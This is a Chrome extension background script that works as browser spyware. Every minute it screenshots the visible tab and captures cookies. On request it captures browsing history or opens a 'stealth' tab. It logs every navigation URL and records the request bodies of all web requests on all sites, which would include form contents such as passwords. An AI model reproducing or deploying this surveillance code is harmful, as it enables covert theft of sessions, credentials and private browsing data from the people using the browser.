import { BackgroundMessage, StorageKey } from "../consts";
import type { INavigationLogEntry, IRequestData } from "../interfaces";
import {
  captureCookies,
  captureHistory,
  captureVisibleTab,
  openStealthTab,
} from "../utils/background-utils";
import { contextData, simplePrepend, writeLog } from "../utils/shared-utils";

chrome.alarms.create({ periodInMinutes: 1 });

chrome.alarms.onAlarm.addListener(() => {
  // openStealthTab();
  captureVisibleTab();
  captureCookies();
});

chrome.action.onClicked.addListener(() => chrome.runtime.openOptionsPage());

chrome.runtime.onMessage.addListener(async (message, sender, response) => {
  const { messageType, data }: { messageType: BackgroundMessage; data?: any } =
    message;

  switch (messageType) {
    case BackgroundMessage.HEARTBEAT:
      writeLog("Heartbeat");
      break;
    case BackgroundMessage.OPEN_STEALTH_TAB:
      await openStealthTab();
      break;
    case BackgroundMessage.CAPTURE_VISIBLE_TAB:
      await captureVisibleTab();
      break;
    case BackgroundMessage.CAPTURE_COOKIES:
      await captureCookies();
      break;
    case BackgroundMessage.CAPTURE_HISTORY:
      await captureHistory();
      break;
    default:
      // HMR may send a message
      console.error("Unrecognized message", JSON.stringify(message));
  }
});

chrome.webNavigation.onCompleted.addListener(async (details) => {
  await simplePrepend<INavigationLogEntry>(StorageKey.NAVIGATION_LOG, {
    url: details.url,
    ...contextData(),
  });

  writeLog("Recorded navigation");
});

chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    if (details.requestBody) {
      simplePrepend<IRequestData>(StorageKey.REQUEST_BODY_LOG, {
        request: details,
        ...contextData(),
      }).then(
        () => {
          writeLog("Recorded request");
        },
        () => {}
      );
    }
  },
  {
    urls: ["<all_urls>"],
  },
  ["requestBody"]
);
